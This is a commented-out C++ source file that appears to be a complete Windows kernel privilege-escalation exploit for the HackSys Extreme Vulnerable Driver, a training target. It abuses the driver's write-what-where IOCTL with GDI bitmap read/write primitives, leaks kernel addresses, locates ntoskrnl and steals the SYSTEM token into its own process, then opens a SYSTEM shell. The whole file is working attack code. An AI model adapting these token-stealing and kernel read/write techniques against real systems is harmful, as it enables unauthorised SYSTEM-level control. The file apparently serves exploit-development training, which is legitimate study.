/*
#include <iostream>
#include <string>
#include <algorithm>

#include <Windows.h>
#include <winternl.h>

#include "helpers.h"
#include "ntstructs.h"


HBITMAP MANAGER_BITMAP = 0;
HBITMAP WORKER_BITMAP = 0;

int exploitWriteWhatWhere(unsigned long long what, unsigned long long where) {
	std::wstring deviceName = L"\\\\.\\HackSysExtremeVulnerableDriver";

	void* deviceHandle = CreateFileW(deviceName.c_str(),
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		0,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,
		0);

	if (INVALID_HANDLE_VALUE == deviceHandle) {
		std::cout << "CreateFileW Failed" << std::endl;
		return -1;
	}

	WRITE_WHAT_WHERE input;
	input.What = (unsigned long long)&what;
	input.Where = where;

	DeviceIoControl(deviceHandle, WRITE_WHAT_WHERE_IOCTL_CODE, &input, 8, 0, 0, 0, 0);

	return 0;
}

void* getPebAddress() {
	void* peb;
	PROCESS_BASIC_INFORMATION basicInfo = { 0 };
	unsigned long returned = 0;
	NTQUERYINFORMATIONPROCESS NtQueryInformationProcess;
	*(FARPROC*)&NtQueryInformationProcess = GetProcAddress(LoadLibraryA("ntdll.dll"), "NtQueryInformationProcess");
	NtQueryInformationProcess(GetCurrentProcess(), ProcessBasicInformation, &basicInfo,
		sizeof(PROCESS_BASIC_INFORMATION), &returned);

	return basicInfo.PebBaseAddress;
}

void* leakUserObjectAddress(void* handle) {
	USER_HANDLE_ENTRY* handleEntry = 0;
	SHAREDINFO* gSharedInfo = (SHAREDINFO*)GetProcAddress(GetModuleHandleA("user32.dll"), "gSharedInfo");
	USER_HANDLE_ENTRY* gHandleTable = gSharedInfo->aheList;

	handleEntry = &gHandleTable[(unsigned long long)handle & 0x000000000000FFFF];

	return handleEntry->pKernel;
}


void* leakLargePoolAllocationAddress() {
	char buff[10000];
	std::fill(buff, buff + 10000, 0x41);

	HACCEL atHandle = CreateAcceleratorTableA((LPACCEL)&buff, 700);
	void* kernelAddress = leakUserObjectAddress((void*)atHandle);
	std::cout << "Found KernelAddress at 0x" << std::hex << kernelAddress << std::endl;

	DestroyAcceleratorTable(atHandle);

	return kernelAddress;
}

void createPrimitives() {
	char data[0x280];
	memset(data, 'A', 0x27f);
	data[0x27f] = '\x00';

	void* managerSurface = leakLargePoolAllocationAddress();
	while (MANAGER_BITMAP == 0) {
		MANAGER_BITMAP = CreateBitmap(0x701, 0x2, 0x1, 8, &data);
	}
	std::cout << "Manager handle: 0x" << std::hex << MANAGER_BITMAP << std::endl;
	std::cout << "Manager: 0x" << std::hex << managerSurface << std::endl;

	void* workerSurface = leakLargePoolAllocationAddress();
	while (WORKER_BITMAP == 0) {
		WORKER_BITMAP = CreateBitmap(0x701, 0x2, 0x1, 8, &data);
	}
	std::cout << "Worker handle: 0x" << std::hex << WORKER_BITMAP << std::endl;
	std::cout << "Worker: 0x" << std::hex << workerSurface << std::endl;

	unsigned long long workerPvScan0Address = (unsigned long long)workerSurface + 0x18 + 0x38;
	unsigned long long managerPvScan0Address = (unsigned long long)managerSurface + 0x18 + 0x38;

	exploitWriteWhatWhere(workerPvScan0Address, managerPvScan0Address);

	std::cout << "Exploited Write-What-Where" << std::endl;
}

unsigned long long readQword(unsigned long long address) {
	unsigned long long data = 0;
	SetBitmapBits(MANAGER_BITMAP, 8, &address);
	GetBitmapBits(WORKER_BITMAP, 8, &data);
	return data;
}

void writeQword(unsigned long long address, void* data) {
	SetBitmapBits(MANAGER_BITMAP, 8, &address);
	SetBitmapBits(WORKER_BITMAP, 8, data);
}

unsigned long long getNtoskrnlBase() {
	unsigned long long baseAddress = 0;
	unsigned long long ntAddress = readQword(0xffffffffffd00448) - 0x110000;
	unsigned long long signature = 0x00905a4d;
	unsigned long long searchAddress = ntAddress & 0xfffffffffffff000;

	while (true) {
		unsigned long long readData = readQword(searchAddress);

		if ((readData & 0x00000000FFFFFFFF) == signature) {
			baseAddress = searchAddress;
			break;
		}
		searchAddress = searchAddress - 0x1000;
	}

	return baseAddress;
}

unsigned long long PsInitialSystemProcess() {
	unsigned long long systemProcessAddress;
	unsigned long long kernelNtos = getNtoskrnlBase();
	std::cout << "ntoskrnl.exe Base: 0x" << std::hex << kernelNtos << std::endl;

	void* userNtos = LoadLibraryA("ntoskrnl.exe");

	systemProcessAddress = kernelNtos +
		((unsigned long long)GetProcAddress((HMODULE)userNtos, "PsInitialSystemProcess") - (unsigned long long)userNtos);

	std::cout << "System process is at 0x" << std::hex << systemProcessAddress << std::endl;
	return readQword(systemProcessAddress);
}

void elevatePrivileges() {
	unsigned long long systemProcess;
	unsigned long long currentProcess;
	void* systemToken;
	unsigned long pid;

	//unsigned long long tokenOffset = offsetof(_EPROCESS, Token);
	//unsigned long long activeProcessLinksOffset = offsetof(_EPROCESS, ActiveProcessLinks);
	//unsigned long long pidOffset = offsetof(_EPROCESS, UniqueProcessId);
	unsigned long long tokenOffset = 0x358;
	unsigned long long activeProcessLinksOffset = 0x2f0;
	unsigned long long pidOffset = 0x2e8;

	unsigned long currentPid = GetCurrentProcessId();
	systemProcess = PsInitialSystemProcess();
	std::cout << "Found system process at 0x" << std::hex << systemProcess << std::endl;
	systemToken = (void*)readQword(systemProcess + tokenOffset);
	std::cout << "Found system token at 0x" << std::hex << systemToken << std::endl;

	currentProcess = systemProcess;
	do {
		currentProcess = readQword(currentProcess + activeProcessLinksOffset) - activeProcessLinksOffset;
		pid = readQword(currentProcess + pidOffset);
	} while (pid != currentPid);

	std::cout << "Found current process at 0x" << std::hex << currentProcess << std::endl;

	writeQword(currentProcess + tokenOffset, &systemToken);
}

int main() {
	createPrimitives();
	elevatePrivileges();
	std::cout << "Enjoy system priviliges :-)" << std::endl;
	system("cmd.exe");


	int i = 0;
	std::cin >> i;
	std::cout << i;

	return 0;
}
*/